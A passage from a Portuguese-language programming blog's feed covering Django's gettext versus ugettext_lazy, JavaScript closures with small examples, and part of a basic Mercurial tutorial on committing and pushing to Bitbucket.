com internacionalização, já devem ter feito a seguinte pergunta: Quando
usar &lt;code&gt;gettext&lt;/code&gt; e &lt;code&gt;gettext_lazy&lt;/code&gt;?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Acredito que antes de responder esta pergunta, temos que responder outra
questão pertinente: Devo utilizar &lt;code&gt;gettext&lt;/code&gt; ou &lt;code&gt;ugettext&lt;/code&gt;?&lt;/p&gt;
&lt;h2&gt;gettext vs ugettext&lt;/h2&gt;
&lt;p&gt;Essas duas funções seguem o mesmo princípio dos métodos mágicos
&lt;code&gt;__str__&lt;/code&gt; e &lt;code&gt;__unicode__&lt;/code&gt;. Onde &lt;code&gt;gettext&lt;/code&gt; retornará um texto traduzido
como uma &lt;em&gt;string&lt;/em&gt; “comum”, e &lt;code&gt;ugettext&lt;/code&gt; retornará um texto traduzido
como uma &lt;em&gt;string&lt;/em&gt; &lt;em&gt;Unicode&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Como nosso idioma nativo abusa do uso de caracteres especiais, aconselho
sempre que possível a utilização do &lt;code&gt;ugettext&lt;/code&gt;. Na verdade, é uma
forma de garantir sucesso na tradução de qualquer idioma sem quebrar a
cabeça com &lt;em&gt;encoding&lt;/em&gt; (já que o &lt;em&gt;Unicode&lt;/em&gt; tem uma ampla tabela de
caracteres).&lt;/p&gt;
&lt;p&gt;Além disso, passe a mensagem como &lt;em&gt;Unicode&lt;/em&gt; para a função sempre que
necessário:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;texto_traduzido&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ugettext&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Descrição do produto em estoque&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;ugettext vs ugettext_lazy&lt;/h2&gt;
&lt;p&gt;A principal diferença entre &lt;code&gt;ugettext&lt;/code&gt; e &lt;code&gt;ugettext_lazy&lt;/code&gt; é que o
último é literalmente um preguiçoso. Ele faz uma referência para a
&lt;em&gt;string&lt;/em&gt; (e não necessariamente para a tradução), fazendo com que a
operação seja executada apenas quando a renderização da &lt;em&gt;string&lt;/em&gt; é
necessária (ao contrário de &lt;code&gt;ugettext&lt;/code&gt; que é processado assim que a
expressão é interpretada).&lt;/p&gt;
&lt;p&gt;Confuso? Talvez o &lt;a href="http://www.aprendendodjango.com/o-mesmo-site-em-varios-idiomas/" title="Aprendendo Django no Planeta Terra - O mesmo site em vários idiomas"&gt;&lt;em&gt;Marinho Brandão&lt;/em&gt;&lt;/a&gt; possa ser mais claro:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A função “&lt;strong&gt;ugettext_lazy()&lt;/strong&gt;“ é &lt;strong&gt;preguiçosa&lt;/strong&gt;. Isso significa que a
tradução é feita somente quando ela é requisitada, o que é&lt;br&gt;
relativamente melhor para o caso de classes de modelo, pois elas&lt;br&gt;
são constantemente utilizadas sem que a tradução de um termo seja&lt;br&gt;
necessário de fato.&lt;/p&gt;
&lt;p&gt;Por outro lado a função “&lt;strong&gt;ugettext()&lt;/strong&gt;“ traduz a string&lt;br&gt;
&lt;strong&gt;instantaneamente&lt;/strong&gt;, o que é melhor para casos como o de formulários&lt;br&gt;
dinâmicos e views, pois eles não são usados de maneira tão constante&lt;br&gt;
quanto classes de modelo.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Então… utilize &lt;code&gt;ugettext_lazy&lt;/code&gt; nos campos e meta-informações dos
modelos (onde a tradução pode ser feita sob demanda), e &lt;code&gt;ugettext&lt;/code&gt; em
métodos, funções e views (onde a tradução tem quer ser “instantânea”).&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.python.org/library/gettext.html" title="gettext - Multilingual internationalization services"&gt;&lt;em&gt;Python Documentation – gettext&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/i18n/internationalization/#lazy-translation" title="Django Docs - Lazy Translation"&gt;&lt;em&gt;Django Documentation – Internationalization&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.djangobook.com/en/1.0/chapter18/" title="The Django Book - i18n"&gt;&lt;em&gt;The Django Book – Internationalization&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.aprendendodjango.com/o-mesmo-site-em-varios-idiomas/" title="Aprendendo Django - O mesmo site em vários idiomas"&gt;Aprendendo &lt;em&gt;Django&lt;/em&gt; no Planeta Terra – O mesmo &lt;em&gt;site&lt;/em&gt; em vários idiomas&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="python"></category><category term="django"></category><category term="i18n"></category></entry><entry><title>Afinal, o que são Closures?</title><link href="https://klauslaube.com.br/2011/05/29/afinal-o-que-sao-closures.html" rel="alternate"></link><published>2011-05-29T13:52:00-03:00</published><updated>2011-05-29T13:52:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-05-29:/2011/05/29/afinal-o-que-sao-closures.html</id><summary type="html">&lt;p&gt;Sabem aqueles conceitos, que a gente sempre utiliza e chega alguém com
um nome “pomposo” para a parada (que você nunca ouviu falar)? Isso
aconteceu comigo com &lt;em&gt;closures&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;What (the hell) are closures?&lt;/h2&gt;
&lt;p&gt;Entendi o conceito de &lt;em&gt;closures&lt;/em&gt; enquanto estudava &lt;em&gt;Ruby&lt;/em&gt;. Na verdade,
fica a dica… se você quer aprender …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Sabem aqueles conceitos, que a gente sempre utiliza e chega alguém com
um nome “pomposo” para a parada (que você nunca ouviu falar)? Isso
aconteceu comigo com &lt;em&gt;closures&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;What (the hell) are closures?&lt;/h2&gt;
&lt;p&gt;Entendi o conceito de &lt;em&gt;closures&lt;/em&gt; enquanto estudava &lt;em&gt;Ruby&lt;/em&gt;. Na verdade,
fica a dica… se você quer aprender &lt;a href="https://klauslaube.com.br/tag/oop.html" title="Leia mais sobre Orientação a Objetos"&gt;Orientação a Objetos&lt;/a&gt;, aprenda
linguagens dinâmicas como &lt;em&gt;Ruby&lt;/em&gt;, &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e até mesmo &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;.
Depois parta para linguagens mais “hardcore” como &lt;em&gt;Java&lt;/em&gt; e &lt;em&gt;C++&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos deixar a &lt;a href="http://pt.wikipedia.org/wiki/Closure" title="Leia sobre closure no Wikipedia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt; nos explicar o que é uma &lt;em&gt;closure&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Uma closure ocorre normalmente quando uma função é declarada dentro do
corpo de outra, e a função interior referencia variáveis locais da
função exterior. Em tempo de execução, quando a função exterior é
executada, então uma closure é formada, que consiste do código da
função interior e referências para quaisquer variáveis no escopo da
função exterior que a closure necessita.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ok… sou a favor das pessoas que dizem que é difícil compreender alguns
conceitos apenas por parágrafos formados por palavras bem escritas.
Vamos ao exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;digaSeuNome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Olá &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;. Seja bem-vindo!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;exibeMensagem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nx"&gt;msg&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;

    &lt;span class="nx"&gt;exibeMensagem&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="nx"&gt;digaSeuNome&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;João&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;    &lt;span class="c1"&gt;// Olá João. Seja bem-vindo!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Temos uma função definida dentro de outra função. A função interna
utiliza de parâmetros e variáveis da função externa… basicamente, este é
o conceito de &lt;em&gt;closure&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Não achou muito útil? Dê uma olhada no exemplo abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;FabricaDeUsuarios&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;criaUsuario&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;
        &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;criaUsuario&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;novoUsuario&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;FabricaDeUsuarios&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;joao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;novoUsuario&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;João&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;jose&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;novoUsuario&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;José&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;joao&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;    &lt;span class="c1"&gt;// 1&lt;/span&gt;
&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;jose&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;    &lt;span class="c1"&gt;// 2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Utilizamos o conceito de &lt;em&gt;closure&lt;/em&gt; no exemplo acima. Abusamos do
contexto da linguagem, onde, mesmo que estejamos “chamando” a função
fora do escopo de &lt;code&gt;FabricaDeUsuarios&lt;/code&gt;, na verdade &lt;code&gt;novoUsuario&lt;/code&gt;
trata-se de uma referência a função &lt;code&gt;criaUsuario&lt;/code&gt;. Logo, ainda
estaremos utilizando os recursos do contexto de &lt;code&gt;FabricaDeUsuarios&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.javascriptkit.com/javatutors/closures.shtml" title="Alguns exemplos de closures com Javascript"&gt;&lt;em&gt;Javascript Closures – They’re not magic&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.morrisjohns.com/javascript_closures_for_dummies" title="Leia sobre Closures em Javascript"&gt;&lt;em&gt;Morris Johns – Javascript Closures for Dummies&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en/JavaScript/Guide/Closures" title="Leia sobre Closures no guia Javascript da Mozilla"&gt;&lt;em&gt;Mozilla Developer Network – Closures&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://devlog.waltercruz.com/closures" title="Closures em Ruby"&gt;&lt;em&gt;Walter Cruz – Closures&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;E você… tem algum exemplo bacana sobre &lt;em&gt;closures&lt;/em&gt;? Não deixe de
comentar.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="closures"></category><category term="oop"></category><category term="javascript"></category></entry><entry><title>Como versionar projetos Django com o Mercurial - Parte 2</title><link href="https://klauslaube.com.br/2011/05/22/como-versionar-projetos-django-mercurial-parte-2.html" rel="alternate"></link><published>2011-05-22T11:04:00-03:00</published><updated>2011-05-22T11:04:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-05-22:/2011/05/22/como-versionar-projetos-django-mercurial-parte-2.html</id><summary type="html">&lt;p&gt;Dando continuidade ao &lt;em&gt;post&lt;/em&gt; &lt;a href="https://klauslaube.com.br/2011/05/10/como-versionar-projetos-django-mercurial-parte.html" title="Leia a primeira parte deste post"&gt;Como versionar
projetos &lt;em&gt;Django&lt;/em&gt; com o &lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;, e a série &lt;a href="{filename}03-montando-seu-ambiente-de-desenvolvimento-django-no-linux.md" title="Tá começando com Django? É usuário Linux? Este post pode te interessar"&gt;Montando seu ambiente
de desenvolvimento &lt;em&gt;Django&lt;/em&gt; no &lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;, vamos dar uma pincelada nos
funcionamentos básicos do &lt;a href="https://klauslaube.com.br/tag/mercurial.html" title="Leia mais sobre Mercurial"&gt;&lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;hg? Mas não era Mercurial?&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Mercury&lt;/em&gt; em português significa mercúrio (nenhuma novidade até aqui),
que é um elemento químico …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Dando continuidade ao &lt;em&gt;post&lt;/em&gt; &lt;a href="https://klauslaube.com.br/2011/05/10/como-versionar-projetos-django-mercurial-parte.html" title="Leia a primeira parte deste post"&gt;Como versionar
projetos &lt;em&gt;Django&lt;/em&gt; com o &lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;, e a série &lt;a href="{filename}03-montando-seu-ambiente-de-desenvolvimento-django-no-linux.md" title="Tá começando com Django? É usuário Linux? Este post pode te interessar"&gt;Montando seu ambiente
de desenvolvimento &lt;em&gt;Django&lt;/em&gt; no &lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;, vamos dar uma pincelada nos
funcionamentos básicos do &lt;a href="https://klauslaube.com.br/tag/mercurial.html" title="Leia mais sobre Mercurial"&gt;&lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;hg? Mas não era Mercurial?&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Mercury&lt;/em&gt; em português significa mercúrio (nenhuma novidade até aqui),
que é um elemento químico com o símbolo &lt;code&gt;Hg&lt;/code&gt; e o número atômico 80
(assim disse a &lt;a href="http://en.wikipedia.org/wiki/Mercury_(element)" title="Leia mais sobre o elemento químico Mercúrio"&gt;&lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt; (: ). É devido a isso que você utilizará
o &lt;em&gt;Mercurial&lt;/em&gt; em linha de comando através de comandos iniciados por
&lt;code&gt;hg&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Antes de iniciarmos, vamos dizer ao &lt;em&gt;Mercurial&lt;/em&gt; quem nós somos. Abra o
arquivo &lt;code&gt;.hgrc&lt;/code&gt; do seu &lt;code&gt;home&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ vim ~/.hgrc
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É fundamental que nossos &lt;em&gt;commits&lt;/em&gt; estejam marcados com nosso nome, e um
e-mail para contato. Vamos escrever estas duas informações neste
arquivo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[ui]&lt;/span&gt;
&lt;span class="na"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;seu nome &amp;lt; seuemail@provedor.com &amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Salve o arquivo, e estamos prontos para iniciar.&lt;/p&gt;
&lt;h2&gt;Primeiros passos&lt;/h2&gt;
&lt;p&gt;Os passos que vou exemplificar aqui não são muito diferentes dos que
você encontrará na &lt;a href="http://mercurial.selenic.com/" title="Visite a página oficial do projeto Mercurial"&gt;página oficial do &lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;. Preguiça minha?
Talvez… mas você verá que usar o &lt;em&gt;Mercurial&lt;/em&gt; é extremamente simples! As
dificuldades são as exceções do dia a dia.&lt;/p&gt;
&lt;p&gt;Para deixar o exemplo mais interessante, vamos utilizar o &lt;em&gt;virtualenv&lt;/em&gt;.
Dúvidas? Confira o &lt;em&gt;post&lt;/em&gt; &lt;a href="https://klauslaube.com.br/2011/03/18/python-django-virtualenv.html" title="Construa projetos isolados do seu sistema com virtualenv"&gt;&lt;em&gt;Python&lt;/em&gt;, &lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt; e
visualize aonde pretendemos chegar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; ˜/Projetos/
$ virtualenv DjangoComHG --no-site-packages

$ &lt;span class="nb"&gt;cd&lt;/span&gt; DjangoComHG
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora sim, vamos criar um projeto através da seguinte expressão:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ hg init django-com-hg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Projeto criado… vamos partir para as tarefas mais comuns no &lt;em&gt;Mercurial&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Altere, adicione e “comite”&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Mercurial&lt;/em&gt; é &lt;a href="http://en.wikipedia.org/wiki/Distributed_revision_control" title="Leia mais sobre Distributed Version Control System"&gt;&lt;em&gt;DVCS&lt;/em&gt;&lt;/a&gt;, isto quer dizer que, quando você clonar um
repositório remoto você terá uma cópia exata dele em seu computador.
Logo, as alterações que você “persistir” estarão disponíveis apenas na
sua cópia local. Pode parecer um pouco confuso, mas com o tempo faz todo
o sentido.&lt;/p&gt;
&lt;p&gt;Para o primeiro &lt;em&gt;commit&lt;/em&gt; (persistir nossas alterações localmente)
escreva um arquivo &lt;code&gt;.hgignore&lt;/code&gt; (&lt;a href="http://mercurial.selenic.com/wiki/.hgignore" title="Entenda para que serve o arquivo .hgignore"&gt;saiba mais do que se trata&lt;/a&gt;) e um
arquivo &lt;code&gt;README&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; django-com-hg/
$ ls -a

.hg     .hgignore     README
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A pasta &lt;code&gt;.hg&lt;/code&gt; na verdade é quem vai identificar e armazenar todas as
informações do nosso projeto. Sem ela, você deixa de ter o controle
sobre as versões dos arquivos e subpastas do projeto.&lt;/p&gt;
&lt;p&gt;Execute o comando &lt;code&gt;hg status&lt;/code&gt; e veja o que aparece… acredito que o
resultado seja auto-sugestivo. O &lt;em&gt;Mercurial&lt;/em&gt; ainda não sabe o que fazer
com os arquivos no projeto, portanto diremos a ele que queremos
versionar estes arquivos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ hg add .hgignore README
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Uma nova execução do &lt;code&gt;hg status&lt;/code&gt; vai apontar que os arquivos foram
marcados para adição, porém, ainda não foram adicionados. Você vai
confirmar está operação através do comando &lt;code&gt;commit&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ hg commit -m &lt;span class="s2"&gt;&amp;quot;Primeiro commit com .hgignore&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O parâmetro &lt;code&gt;-m&lt;/code&gt; serve para passarmos uma mensagem de descrição do
&lt;code&gt;commit&lt;/code&gt; que estamos fazendo. Isto facilita na leitura do &lt;em&gt;log&lt;/em&gt; de
&lt;em&gt;commits&lt;/em&gt; realizados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ hg log
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Estes serão os comandos que provavelmente você usará constantemente
enquanto desenvolve.&lt;/p&gt;
&lt;h2&gt;Compartilhando as suas produções&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/bitbucket-logo.png" width="180" height="180" title="Logotipo do BitBucket" alt="Logotipo do BitBucket"&gt;&lt;/p&gt;
&lt;p&gt;Se você ainda não tem uma conta no
&lt;a href="http://bitbucket.org/" title="Bitbucket, compartilhe o seu código"&gt;&lt;em&gt;Bitbucket&lt;/em&gt;&lt;/a&gt;, essa é uma grande oportunidade para fazer uma.&lt;/p&gt;
&lt;p&gt;Vamos criar um repositório para praticarmos o comando &lt;code&gt;push&lt;/code&gt;. No
&lt;em&gt;Bitbucket&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Eu vou dar o nome de “post-django-com-hg” ao repositório, fique a
  vontade para dar o nome que você desejar;&lt;/li&gt;
&lt;li&gt;Escolha o &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; como linguagem;&lt;/li&gt;
&lt;li&gt;Coloque uma pequena descrição;&lt;/li&gt;
&lt;li&gt;Eu vou marcar a opção "Issue tracking", caso haja algum problema com
  o código e vocês queiram sugerir melhorias.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://bitbucket.org/kplaube/post-django-com-hg" title="Confira o repositório criado no Bitbucket"&gt;Confira o resultado&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;No repositório local vamos utilizar o comando &lt;code&gt;push&lt;/code&gt; com o endereço do
repositório no &lt;em&gt;Bitbucket&lt;/em&gt;. Isso enviará todas as alterações que
persistidas em nosso repositório local para o repositório remoto,
mesclando-as com as contribuições de outros usuários envolvidos no
projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ hg push https://bitbucket.org/kplaube/post-django-com-hg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Lembre-se&lt;/strong&gt; de mudar o endereço acima para o endereço do seu
repositório no &lt;em&gt;Bitbucket&lt;/em&gt;. Visite a página do seu repositório e veja o
que aconteceu… bacana, não?&lt;/p&gt;
&lt;p&gt;Mas dessa forma, teremos que sempre executar o comando &lt;code&gt;pus&lt;/code&gt;h
informando o endereço do repositório. Vamos deixar esta tarefa mais
simples editando o arquivo &lt;code&gt;hgrc&lt;/code&gt; dentro da pasta &lt;code&gt;.hg&lt;/code&gt; do projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~/Projetos/DjangoComHG/django-com-hg/
$ vim .hg/hgrc
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Coloque o seguinte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[paths]&lt;/span&gt;
&lt;span class="na"&gt;default&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;https://kplaube@bitbucket.org/kplaube/post-django-com-hg&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Lembre-se&lt;/strong&gt; de mudar o endereço acima para o endereço do seu
repositório no &lt;em&gt;Bitbucket&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Pronto! Quando você for “pushear” não precisará mais informar o endereço
do repositório remoto.&lt;/p&gt;
&lt;p&gt;Altere alguns arquivos… &lt;code&gt;commit&lt;/code&gt;. Adicione alguns arquivos…
&lt;code&gt;commit&lt;/code&gt;. Ao final do dia, dê um &lt;code&gt;push&lt;/code&gt; e deixe o resto da equipe
saber o que você fez ;)&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://mercurial.selenic.com/" title="Mercurial, work easier, work faster"&gt;Site oficial do projeto &lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Mercurial" title="Leia mais sobre Mercurial na Wikipedia"&gt;Artigo na &lt;em&gt;Wikipedia&lt;/em&gt; sobre &lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Mercury_(element)" title="Leia mais sobre Mercúrio no Wikipedia"&gt;Artigo na &lt;em&gt;Wikipedia&lt;/em&gt; sobre Mercúrio (o elemento químico)&lt;/a&gt;&lt;/li&gt;
